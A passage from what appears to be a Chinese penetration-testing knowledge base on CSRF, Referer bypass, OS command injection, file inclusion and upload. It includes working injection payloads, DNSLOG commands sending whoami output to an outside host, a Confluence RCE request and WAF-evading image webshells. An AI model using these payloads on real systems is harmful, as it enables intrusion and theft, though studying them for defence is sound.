服务端验证token(保证token时效性) 服务端校验验证码（对每个需要与后端交互的表单，请求做本人验证） 其中1，2是常用，3考虑用户交互，就直接舍弃了。 GET 型请求 在web应用中，很多接口通过GET进行数据的请求和存储，如果未对来源进行校验，并且没有token保护，攻击者可以直接通过发送含有poc的链接进行诱导点击。此外，亦可以通过评论区或类似功能处发布图片，通过修改img地址的方式保存至页面，用户访问便会进行自动加载造成攻击。 假如存在修改密码的场景，发送的数据包如下： http://192.168.200.38:8080/editPassword?oldpassword=xxx&newpassword=xxx 当攻击者知道了后台结构，即可将上述链接放置在img标签，只要受害者在cookie未失效，且服务端未提供任何保护的情况下，就可以直接修改受害者的密码 POST 型请求 表单格式 表单格式则是传统表单submit，多用于前后端不分离的web项目中 一般表单格式的POST请求，在如SpringBoot项目中，注解如果是@RequestMaping('/')没有指定是GET还是POST的情况下，可以使用GET型测试绕过，测试方法使用burp的Engagement生成CSRF poc 测试 json格式 json格式，是指Content-Type: application/json的请求，多用于前后端分离的项目，使用ajax异步请求获取数据 由于ajax请求中，如果发送json格式的数据包，除了判断来源和时候存在token以外，由于服务端对提交的数据包会进行预验，也就是在POST请求前的options数据包，这个options是浏览器自己发起的，用于检验是否同源，服务端是否允许访问，浏览器对复杂跨域请求在真正发送请求之前,会先进行一次预请求,就是参数为OPTIONS的第一次请求,他的作用是用于试探性的服务器响应是否正确,即是否能接受真正的请求,如果在options请求之后获取到的响应是拒绝性质的,例如500等http状态,那么它就会停止第二次的真正请求的访问。所以常规的poc是无法执行的。 闭合JSON 条件：Content-Type未做限制 可以看到这段POST数据结尾多了一个=，这种情况下服务端的JSON解析器可能会拒绝这段JSON，因为它不符合JSON数据格式。 这时候我们可以给value赋值从而对=后的数据进行补全，使其构造成一个完整的json格式，可以避免解析器报错 (这个图片是从公司Wiki里搞下来的，没有来源，如有侵权请联系我) Ajax发起请求 条件：Content-Type未做限制 当跨域影响用户数据HTTP请求(如用XMLHttpRequest发送post)时，浏览器会发送预检请求(OPTIONS请求)给服务端征求支持的请求方法，然后根据服务端响应允许才发送真正的请求。 然而如果服务端对Content-Type进行校验，则不会响应这个OPTIONS请求，从而利用失败。但是更多的情况下服务端可能不会校验Content-Type，或者不会严格校验Content-Type是否为application/json，所以很多情况下这是可用的。 windows.onload = () => { var xhr = new XMLHttpRequest() xhr.open(\"POST\", \"https://www.xxxxx.com/simauth/app/updateAppInfo\") xhr.setRequestHeader(\"Accept\", \"*/*\") xhr.setRequestHeader(\"Accept-Language\", \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\") xhr.setRequestHeader(\"Content-Type\", \"application/json; charset=utf-8\") xhr.withCredentials = true // 携带cookie xhr.send(JSON.stringify({\"appId\":\"300016001555\",\"appName\":\"0xdawn\"}) } 其他 这里说一下referer，referer是http头的字段，但是W3C官方为了规范Referer ，又提出了Referrer Policy，referer头不能自定义，但是referrer可以由用户自定义是否携带referer,或者只携带origin，以下用代码展示： web服务采用node.js const express = require('express') const app = express() app.use(express.json()) app.use(express.urlencoded({ extended: false })) app.all('*', function(req, res, next) { res.header('Access-Control-Allow-Origin', '*') //需要显示设置来源 // 'Access-Control-Allow-Headers', 'Content-Type' res.header( 'Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization' ) res.header('Access-Control-Allow-Methods', 'POST,GET,OPTIONS') res.header('Access-Control-Allow-Credentials', true) //带cookies res.header('Content-Type', 'application/json;charset=utf-8') if (req.method == 'OPTIONS') { res.sendStatus(200) } else { next() } }) app.get('/', (req, res) => { console.log(req.query) res.header('Content-type','text/html') res.send('hello world') }) app.post('/',(req, res) => { console.log(req.headers.referer) res.send(req.headers.referer) }) app.listen(8888, () => { console.log('running!') }) HTML 这里注意meta标签，可以看到这里添加了referrer为never Document var xmlhttp = new XMLHttpRequest() xmlhttp.open(\"POST\", \"http://192.168.200.75:8888/\") xmlhttp.setRequestHeader('Content-Type', 'application/json') data = { name: 'aaron', value: 'test' } xmlhttp.send(JSON.stringify(data)) 可以看到这里带上了Referrer Policy，然后请求包里是没有referer头的 最初是只有5种策略的，现在规范增加到9种 enum ReferrerPolicy { \"\", \"no-referrer\", \"no-referrer-when-downgrade\", \"same-origin\", \"origin\", \"strict-origin\", \"origin-when-cross-origin\", \"strict-origin-when-cross-origin\", \"unsafe-url\" }; 也正是因为有了这些策略，在不安全的情况下，不携带Referer，但是相关接口又必须验证Referer的情况下，就可以达到阻止CSRF攻击的效果 参考链接 https://www.w3.org/TR/referrer-policy/ https://blog.csdn.net/weixin_45284354/article/details/112485880 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 15:07:53 "},"知识库/01.WEB安全/03.CSRF/CSRF绕过Referer技巧.html":{"url":"知识库/01.WEB安全/03.CSRF/CSRF绕过Referer技巧.html","title":"CSRF绕过Referer技巧","keywords":"","body":"前言 防止CSRF漏洞常用的方法一般有2个，那就是验证referer和增加token； 由于校验referer一般是通过正则表达式来进行匹配，开发人员可能存在疏忽，导致了被绕过的可能（正常情况下验证referer是不能绕过的） 绕过 空referer 和标题一样，测试时就是给数据包中的referer置空即可，有些网站可能没有考虑到referer为空的情况或者业务需要referer为空的情况从而导致了绕过 如果要实际利用，那么可以使用以下的一些方法： form表单页面加上如下内容： a标签的一个属性ref TEST 利用其他的协议，比如data:、file:等 如果目标是http的站点，那么将poc放到https的站点上，从https的站点跳转到http的站点，也是不带有referer的 关键词绕过 查看是否必须存在指定的关键词，如必须存在abc.com，那么我们只需要使用xxx.com/poc.html?abc.com即可绕过（?也可以换成其他的一些符号，只要不影响html解析就行，比如#） 指定域绕过 相比上一个更难，比如referer必须在域abc.com下，这种情况也有一些方法： 使用@，比如abc.com@xxx.com/poc.html 看看子域名有不有发布文章的功能的地方，比如存在一个子域名forum.abc.com可以发布文章，那么把poc发布到这个域名下诱导其他人访问也是可以的 如果是GET型CSRF，思路和第二条也差不多，只是要简单很多，找个能从网站内访问POC的点即可，比如网站头像处设置成CSRF的POC 找一个任意URL跳转的漏洞来结合 结合XSS 总结 绕过方法总体来说有2种 第一种就是空referer 第二种就是和任意URL跳转一样的绕法 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 15:06:49 "},"知识库/01.WEB安全/04.OS注入/":{"url":"知识库/01.WEB安全/04.OS注入/","title":"04.OS注入","keywords":"","body":"定义 OS 命令注入（也称为 shell 注入）是一种 Web 安全漏洞，允许攻击者在运行应用程序的服务器上执行任意操作系统 (OS) 命令，并且通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用操作系统命令注入漏洞来破坏托管基础架构的其他部分，利用信任关系将攻击转向组织内的其他系统。 常见的场景 后台数据库连接 后台ping测试 后台telnet测试 后台抓包分析工具 系统时间配置 系统更新 后台服务交互处 等等示例 这里使用node.js + express快速搭建web，该web服务需要和python进行数据交换 const express = require('express') const app = new express const shell = require('child_process') const { urlencoded } = require('express') const { stderr } = require('process') app.use(express.json()) app.use(express.urlencoded({ extended: false } )) app.use('/public',express.static('public/html')) app.post('/getData',(req, res) => { console.log(req.body) let productId = req.body.productId let storeId = req.body.storeId let command = `python test.py ${productId} ${storeId}` console.log(command) shell.exec(command, (err, stdout, stderr) => { if (err) { res.send('error') return } else { const data = {} data.stderr = stderr data.stdout = stdout res.send(data) } }) }) app.listen(8088, () => { console.log('running!') }) windows 正常情况返回 当在storeId后添加执行命令的参数来进行os命令注入，如下 { \"productId\":\"22\", \"storeId\":\"3&&whoami\" } Linux { \"productId\":\"22\", \"storeId\":\"3;uname-a\" } 命令执行常用符号 操作系统 符号 释义 windows && command1&& command2 表示先执行command1成功后再执行Command2，否则不执行 & command1 & command2 表示先执行command1，不管是否成功，都会执行command2 || command1 || command2 表示当command1 执行失败后才执行command2，否则只执行command1 | command1 | command2 表示comand1 输出结果作为后面命令的输入内容 > 文件重定向符号，多用于无回显盲注，将命令结果写到文件里 >> 文件追加符号，多用于无回显盲注，将命令结果追加到文件里 Linux && command1 && command2 表示先执行 command1 成功后再执行command2，否则不执行 ; command1;command2 表示先执行command1，不管是否成功，都会执行command2 & command1&command2 表示挂载command1为后台任务，然后再执行command2 || command1 || command2 表示当command1 执行失败后才执行command2，否则只执行command1 | command1 | command2 表示comand1 输出结果作为后面命令的输入内容 `` `command`, 表示在shell里认定给bash，sh解析，而不是认定为字符串，解释器直接以命令执行``里的字符串 $() $(command) 表示在shell编程里表示命令，相当于`` > 文件重定向符号，多用于无回显盲注，将命令结果写到文件里 >> 文件追加符号，多用于无回显盲注，将命令结果追加到文件里 有回显注入 还是以示例为例，在不修改代码的情况下，将上述常用符号过一遍 windows && { \"productId\":\"22\", \"storeId\":\"3&&whoami\" } & { \"productId\":\"22\", \"storeId\":\"3&whoami\" } // 或者让前一个命令为错误 { \"productId\":\"22\", \"storeId\":\"3aa&&whoami\" } || { \"productId\":\"22\", \"storeId\":\"3aa||whoami\" } | { \"productId\":\"22\", \"storeId\":\"3|whoami\" } > >> { \"productId\":\"22\", \"storeId\":\"3&systeminfo>>test.txt\" } 在无回显的时候，注意找到web绝对路径，然后再写入到web路径中去，然后再去访问写入的文件查看命令 Linux Linux中的;对应windows的& 用法一致，还有&&，|，|| ，>，>>用法相同，这里主要展示Linux 中的&， ``，$() 用法 & & 在Linux中是将任务给后台执行，并告知pid，然后再执行后面的命令，当第一个命令执行完毕之后，再返回结果，最后告知第一个命令执行完毕 那么对应的payload如下： { \"productId\":\"22\", \"storeId\":\"3&whoami\" } ``(反斜杠) 反斜杠里的字符串是被Linux shell环境直接执行的，类似php的shell_exec()函数，这个函数简写也是，它的返回值就是命令执行结果，如下所示 ![image.png](README.assets/2023_05_19_10_39_59_Pc84yoFN.png) 那么当`; && & ||` 被过滤掉时，无法构造第二条命令的时候，这时 就发挥作用了，如下payload ping -c 2 127.0.0.1`whoami` 可以看到，whoami 的执行结果已经和127.0.0.1拼接在一起了，通过shell报错也能获取命令 $() 在shell编程中，$()中存放的是命令，相当于`` 无回显注入 这里更改一下代码如下 const express = require('express') const app = new express const shell = require('child_process') const { urlencoded } = require('express') const { stderr } = require('process') const e = require('express') app.use(express.json()) app.use(express.urlencoded({ extended: false } )) app.use('/public',express.static('public/html')) app.post('/getData',(req, res) => { console.log(req.body) let productId = req.body.productId let storeId = req.body.storeId let command = `python test.py ${productId} ${storeId}` console.log(command) shell.exec(command, (err, stdout, stderr) => { if (err) { res.send('error') return } else { const data = {} if (stdout) { data.code = 200 data.message = 'success' res.send(data) } else { data.code = 404 data.message = 'error' res.send(data) } } }) }) app.listen(8088, () => { console.log('running!') }) 在无回显盲注的情况下，在判断是否存在注入点时，可以使用dnslog来判断，也可以使用ping方法（Linux机器一定要加-c参数，否则会造成拒绝服务攻击) DNSLOG windows windows 不像Linux那样可以使用`` 以及$()外带命令执行的结果，但是可以利用windows的变量来外带数据 变量 描述 %USERNAME% 返回当前登录的用户的名称。 %USERDOMAIN% 返回包含用户帐户的域的名称 %OS% 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT %USERPROFILE% 返回当前用户的配置文件的位置 %ALLUSERSPROFILE% 返回“所有用户”配置文件的位置 %APPDATA% 返回默认情况下应用程序存储数据的位置 %CD% 返回当前目录字符串 %CMDCMDLINE% 返回用来启动当前的 Cmd.exe 的准确命令行 %CMDEXTVERSION% 返回当前的“命令处理程序扩展”的版本号 %COMPUTERNAME% 返回计算机的名称 %COMSPEC% 返回命令行解释器可执行程序的准确路径 %DATE% 返回当前日期。 %ERRORLEVEL% 返回上一条命令的错误代码。通常用非零值表示错误。 %HOMEDRIVE% 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 %HOMEPATH% 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 %HOMESHARE% 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的 %LOGONSERVER% 返回验证当前登录会话的域控制器的名称。 %NUMBER_OF_PROCESSORS% 指定安装在计算机上的处理器的数目。 %PATH% 指定可执行文件的搜索路径。 %PATHEXT% 返回操作系统认为可执行的文件扩展名的列表 %PROCESSOR_ARCHITECTURE% 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。 %PROCESSOR_IDENTFIER% 返回处理器说明。 %PROCESSOR_LEVEL% 返回计算机上安装的处理器的型号。 %PROCESSOR_REVISION% 返回处理器的版本号。 %PROMPT% 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。 %RANDOM% 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。 %SYSTEMDRIVE% 返回 Windows server operating system 根目录的位置。 %TEMP%和%TMP% 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。 %TIME% 返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。 %WINDIR% 返回操作系统目录的位置 { \"productId\":\"22\", \"storeId\":\"3&ping -n 1 %USERNAME%.6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net\" } Linux { \"productId\":\"22\", \"storeId\":\"3;ping -c 1 `whoami`.6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net\" } 文件重定向 由于是无回显的命令注入，那么需要找到web的路径，然后将命令写到web绝对路径中查看，示例代码的web解析路径在public/html目录下，那么需要将文件写入到${web}/public/html下，访问${url}/public/xxx即可 windows // 请根据实际需要修改web路径 { \"productId\":\"22\", \"storeId\":\"3&systeminfo > ./public/html/1.txt\" } Linux 命令执行小tips 一般检测方式是使用基于时间，DNSLOG检测，这两种情况都需要 基于时间 基于时间的检测方式大多使用ping命令，也有如nc，curl，telnet，但是这些命令有的服务器是不存在的，所以这里使用ping命令，来对比传输多个包与一个包的时间差异来判断是否存在命令注入 # windows 下 ping -n 12 127.0.0.1 ping -n 1 127.0.0.1 # Linux 下 ping -c 12 127.0.0.1 ping -c 1 127.0.0.1 DNSLOG dnslog 检测，主要是利用dns解析域名会发起dns请求，使用dnslog平台，发起http，dns,icmp等网络请求，只要需要dns解析域名，那么dnslog平台就可以收到域名解析记录 nslookup 6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net ping 6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net curl 6cjo9fo3iffy96gtta0h3lwjoau0ip.burpcollaborator.net ... 常见绕过方式 空格绕过 ${IFS} <>(重定向符号) cat<>test cat %09(需要PHP环境) 黑名单绕过 shell拼接 a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e; base64编码 echo d2hvYW1p | base64 -d | bash 单引号，双引号 c\"\"at fl''ag.tx\"\"t 反斜杠 c\\at fl\\a\\g.tx\\t $1 ca$1t fl$1ag.t$1xt 通配符绕过 /???会去寻找 / 目录下的三个字符长度的文件，正常情况下会寻找到/bin，然后/?[a][t]会优先匹配到/bin/cat,就成功调用了cat命令，然后后面可以使用正常的通配符匹配所需读的文件，如flag.txt文件名长度为8，使用8个?’’，此命令就会读取所有长度为8的文件。 /???/?[a][t] ???????? 同理，我们也可以匹配/bin下的其他命令，如more，less，vi，tail等命令来查看文件，或者执行其他命令，甚至反弹shell 命令嵌套 echo \"result:`whoami`\" echo \"result:$(uname -a)\" >> 文件追加绕过长度限制 [aaron@localhost Desktop]$ echo c\\\\>test [aaron@localhost Desktop]$ echo at \\\\>>test [aaron@localhost Desktop]$ echo f\\\\>>test [aaron@localhost Desktop]$ echo lag.\\\\>>test [aaron@localhost Desktop]$ echo txt>>test [aaron@localhost Desktop]$ bash test 123 # 对应写在test里的命令为 c\\ at \\ f\\ lag.\\ txt 参考链接 https://portswigger.net/web-security/os-command-injection https://www.cnblogs.com/q1ya/articles/14956544.html https://www.bilibili.com/read/cv8197693/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 15:16:46 "},"知识库/01.WEB安全/05.文件操作/01.文件包含.html":{"url":"知识库/01.WEB安全/05.文件操作/01.文件包含.html","title":"01.文件包含","keywords":"","body":"简介 文件包含漏洞是代码注入的一种。其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行，代码注入的典型代表就是文件包含File inclusion。文件包含可能会出现在jsp、php、asp等语言中。服务器通过函数去包含任意文件时，由于要包含的这个文件来源过滤不严，而攻击者可以构造恶意文件在服务器上执行，获取服务器权限。 常见文件包含函数 php: include() 、include_once()、require()、require_once()、fopen()、readfile() jsp: ava.io.file()、java.io.filereader() asp: include file、include virtual 以php举例 include：包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行 require：跟include唯一不同的是，当产生错误时候，include会继续运行而require停止运行 include_once：这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了 require_once：这个函数跟require函数作用几乎相同，与include_once和include类似 php.ini配置文件：allow_url_fopen=off 即不可以包含远程文件。php4存在远程包含&本地包含，php5仅存在本地包含。 使用上面几个函数包含文件时，该文件将作为PHP代码执行，PHP内核并不在意被包含的文件是什么类型的。也就是说用这几个函数包含任何文件时，也会将其当做php文件来执行。 漏洞成因 程序员写程序的时候，不喜欢干同样的事情，也不喜欢把同样的代码（比如一些公用的函数）写几次（抽离公共方法，这样做叫解耦，减少代码冗余度），于是就把需要公用的代码写在一个单独的文件里面，比如 share.php，而后在其它文件需要使用时进行包含调用 示例 DVWA中文件包含漏洞 在开启allow_url_fopen=on，allow_url_include=on 的时候，即允许远程文件包含 包含本地文件： 包含远程文件： 漏洞挖掘场景 引用外部文件，如script 引用内部模板文件 引用远程模板文件 等等案例 0x1 本地文件包含（引用内部模板文件） 在此处可以看到script标签里，引用了vendor/jquery/jquery.min.js，在此处可以看到外部链接由本地文件download.php处理，通过f参数，引用vendor中的js文件 0x2 远程文件包含配合SSTi RCE Atlassian Confluence，在6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令 发送如下数据包 POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: 192.168.93.131:8090 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.93.131:8090 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: CFADMIN_LASTPAGE_ADMIN=%2FCFIDE%2Fadministrator%2Fsettings%2Ffonts%2Ecfm; JSESSIONID=C7A2A62F69D9CF4D3F7F5391E601D109 Connection: close Content-Type: application/json;charset=utf-8 Content-Length: 163 {\"contentId\":\"786458\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/123\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}} 6.12以前的Confluence没有限制文件读取的协议和路径，我们可以使用file:///etc/passwd来读取文件，也可以通过https://...来加载远程文件。 FTP加载远程文件 启动一个ftp服务器，将恶意文件放置在ftp服务器上 #set ($e=\"exp\") #set ($a=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec($cmd)) #set ($input=$e.getClass().forName(\"java.lang.Process\").getMethod(\"getInputStream\").invoke($a)) #set($sc = $e.getClass().forName(\"java.util.Scanner\")) #set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(\"java.io.InputStream\"))) #set($scan=$constructor.newInstance($input).useDelimiter(\"\\\\A\")) #if($scan.hasNext()) $scan.next() #end python -m pyftpdlib -p 2121 -i 0.0.0.0 [-u username -P [password]] HTTPS 包含远程文件 https://pastebin.com/raw/RyUvk1h8 反弹shell Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-13 14:38:38 "},"知识库/01.WEB安全/05.文件操作/02.文件上传.html":{"url":"知识库/01.WEB安全/05.文件操作/02.文件上传.html","title":"02.文件上传","keywords":"","body":"简介 文件上传漏洞是指攻击者上传了当前web服务可执行的文件，导致web站点被攻击者控制，执行系统层的命令。通常上传的文件可能是PE文件，webshell，木马文件等等 漏洞成因 文件上传漏洞是由于程序员未对上传的文件进行严格的验证和过滤,而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全,则会导致严重的后果。 漏洞挖掘场景 前端存在上传业务 命令注入重定向 日志包含 PUT上传 等等 上传条件 上传的文件能被web服务器当成动态脚本来执行 能够访问到上传的文件 如果上传的脚本不能被服务器解析，通常会配合使用文件包含，容器解析漏洞来使文件成为动态脚本 webshell 分类 单/少 功能木马 能完成写入文件、列目录、执行系统命令等少量功能的webshell 逻辑木马 利用系统逻辑漏洞或构造特殊代码，绕过访问控制或执行特殊功能的webshell（比如 php的uaf漏洞） 一句话木马 可以在目标服务器上执行嗲吗，并和客户端（如菜刀、CKnife、冰蝎、蚁剑）进行交互的webshell 多功能木马 根据目标网站语法，编写较多代码，并在服务器上执行，完成大量间谍功能的Webshell 其中一句话木马原理如下图所示： 客户端将代码通过特殊参数名（password)，发送给放置在服务器上的一句话木马，一句话木马则在服务器上执行由客户端发来的代码，然后将执行结果返回给客户端，客户端接收结果之后，最后再将结果展示给用户。 bypass案例 声明该部分案例都是通过kun哥本人同意之后添加进来的（kun哥，前奇安信Ateam队员，我有微信😍） 注册登录到某系统后，在多个文件上传点进行测试，发现进行的大是白名单验证，没法上传除了多媒体文件外的其他类型。最后在修改资料位置对头像上传位置抓包，可以看到还传入了图像裁剪的参数(后续的测试把x,y都设置为0，避免对图片产生额外影响): 可以上传并返回路径，该路径可以通过拼接域名直接访问到： 修改filename类型为txt，发现可以上传成功，说明该处上传没有对文件类型进行限制，是一个潜在的getshell点： 尝试修改文件类型为php，不出意外被阿里云WAF拦截了： 在之前的测试中，已经发现头像上传位置可以进行其他类型文件上传，但是测试php文件上传时被云WAF拦截了。对云WAF的绕过主要可以依靠数据包变形、分块、去除关键字特征等。 文件类型检测绕过 测试将filename中的文件名用换行分隔即可绕过(从文件名中间找个位置，不是文件扩展名) 文件内容检测绕过 WAF还会检测内容，如存在常见的?php就会直接拦截，经过尝试，可以使用[短标签](https://www.php.net/manual/zh/language.basic-syntax.phptags.php)`、敏感函数替换加上传参分离得到payload?=@$_=$_REQUEST;call_user_func_array('assert',array($_[_]));?，这里服务端的systemerror`是因为图像渲染出错的异常: GD库渲染绕过 上面的图片在传到后台时会被php的gd库重新渲染，因为上传的文件重新下载回来md5校验对不上。将文件类型改成txt上传，查看响应包发现特征 gd-jpeg v1: 看来图片是被重新渲染了，使用了php扩展gd库中的imagecreatefromjpeg()，imagecreatefromstring(),``imagejpeg()等函数处理。这些函数在图片渲染过程中，其实存在部分原始数据没有被修改到，不同的图片类型渲染情况也不相同，主要看后端处理后是什么类型的图片特征，上面的图片从文件头JFIF和gd-jpeg看应该是用imagejpeg()生成的。这里对gd库的渲染绕过进行一些整理。 JPG二次渲染 使用脚本jpg_payload.php来处理图片需要先在头像上传的位置上传一个正常的图片，然后再把渲染后的图片下载回来用脚本处理(脚本要求，最终图像的大小必须与原始图像相同)。脚本的原理是在将webshell编码成图像数据写入到图片的Scan Header之后，文件生成后使用gd库测试是否能正常渲染然后输出payload图片。 脚本使用前需要配置好PHP运行环境，直接到PHP官网，选择合适的包下载，这里选择的是Windows下的zip压缩包： 解压完成后，到目录中看到php.ini-*的文件，选择一个重命名为php.ini,然后在其中加入extension=ext/php_gd2.dll开启gd扩展： 之后就配置下PHP的环境变量，在jpg_payload.php中加入要渲染的代码： $miniPayload可能需要多次构造，比如在最前面加字符，中间加注释，字母大写等等，经过许久的尝试，构造出以下两个可用的payload: 在JPEG文件格式中，shell代码会放在Scan Header (00 0C 03 01 00 02 11 03 11 00 3F 00)之后： 在最终构造好的payload图片中看到shell数据确实是写在Scan Header之后的： 在burp中可以很方便的修改上传的文件，在之前的数据包右键菜单中选择从文件粘贴： 上传成txt观察响应，发现php代码没有被破坏： 改成PHP后上传，访问(没有出现语法错误或者解析错误，Deprecated是说不推荐用字符串参数来调用assert断言，因为用了call_user_func_array回调，参数1就是字符串assert)： 然后测试shell执行情况，发现阿里云WAF对特征字符的拦截十分严格，执行var_dump，phpinfo马上就拦截，用PHP7特性执行(phpinfo)()回造成响应超时，应该还检测了响应数据。这里用一个没被拦截的函数die()输出数字来测试webshell执行情况： 可以看到成功执行了，说明shell还是可以用的，就是需要绕过流量特征检测。 这里想着用传递编码的字符到shell执行，但是始终会被拦截。没办法，只能从shell上下手，又经过一些免杀测试，准备好的基础免杀shell为，经过不断的尝试，终于构造出可用的图片： 最终payload(蚁剑中_是保留字符，所以密码修改为了d): $miniPayload = '/sssdajkhsdajk*/ 蚁剑的编码器用的编码器是对所有参数都base64编码(之前的流量中有很明显的PHP执行代码)，返回数据也都base64： 配置编码解码： 发起的请求包如下： 最终也是使用蚁剑接管了该阿里云服务器： 云WAF的流量绕过也可以通过真实IP或者其他解析到站点的域名，因为管理员可能没有对所有的域名和IP走云WAF，就可以只绕过上传php文件的拦截，后面的流量检测是没有的。最开始拿到shell也是走一个加速域名(shell后查看了图片渲染处的源码，为后续直接对阿里云的POC构造省下了好多事)，这里估计是开发想着所有流量都过云WAF会很慢，于是把很多静态资源放在了另外一个域名上，但是这个域名并没有受到云WAF保护，没有云WAF保护，利用上面的二次渲染绕过直接getshell： GIF二次渲染 常见的方法是将GIF上传后的文件下载回来与源文件对比，找到未进行修改的部分插入PHP代码，但是操作起来很不方便。有没有类似JPG实现的自动脚本呢？在一篇博客中发现了实现方法，原脚本将生成一个纯色的GIF图，将脚本修改后可以对任意GIF文件进行代码注入： \"; // POC $_width=200; $_height=200; if(strlen($_payload)%3!=0){ echo \"payload%3==0 !\"; exit(); } $im = imagecreate($_width, $_height); // 创建新的gif图 $im = imagecreatefromstring(file_get_contents(\"SwipeTeachingCalloutImage.layoutdir-LTR.gif\")); //使用提供的Gif图 $_hex=unpack('H*',$_payload); $colors_hex=str_split($_hex[1], 6); for($i=0; $i 经过一番尝试，找到一个合适的GIF图片，并将PHP代码写入(Payload长度达到了64，还可以继续追加)： 然后将生成的example.gif文件使用GD库渲染得到新图exploit.gif： 重新渲染后，完全就是一样的GIF: 最终也是达到了可以指定GIF图、指定Payload的效果。 PNG 二次渲染 写入PLTE数据块 这种方式只针对索引彩色图像(index-color images)有效，使用poc_png工具写入。但是怎么看图片是否是索引彩色图像呢？可以使用Python库pillow来识别图像的模式，P就是索引彩色图像： 输出图像模式的代码实现： #-*- coding:utf-8 -*- from PIL import Image path = 'input.png' img = Image.open(path) print(path+\" mode:\"+img.mode) path = 'php.png' img = Image.open(path) print(path+\" mode:\"+img.mode) 转换图像模式到索引彩色图像： #-*- coding:utf-8 -*- from PIL import Image path = 'input.png' img = Image.open(path) print(path+\" mode:\"+img.mode) img = img.convert('P') img.save('new.png') print(path+\" mode:\"+img.mode) 写入 IDAT 数据块 可以通过php脚本实现，也可以使用其他语言实现的项目，Python：PNG-IDAT-Payload-Generator： $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y 1.png // //写入的webshell 其他的webshell需要通过爆破的方法得到，参考：https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ 总结 从这个实例中，研究了GIF、PNG、JPG图片二次渲染，并整理了生成工具。在漏洞点有二次渲染且存在阿里云WAF的情况下，getshell的流程方法。包括: 1.换行绕过阿里云WAF上传文件检测； 2.jpg_paylaod脚本绕过图片二次渲染； 3.webshell免杀过云WAF上传; 4.流量编码过WAF流量检测。 5.一些用到的基础PHPwebshell: //过文件内容检测 绕过总结 0x1 前端检测 function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } } 禁用JavaScript（不适用于由js框架开发的web系统） 修改webshell 文件后缀，抓包在burp里修改 0x2 MIME-Type验证 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = 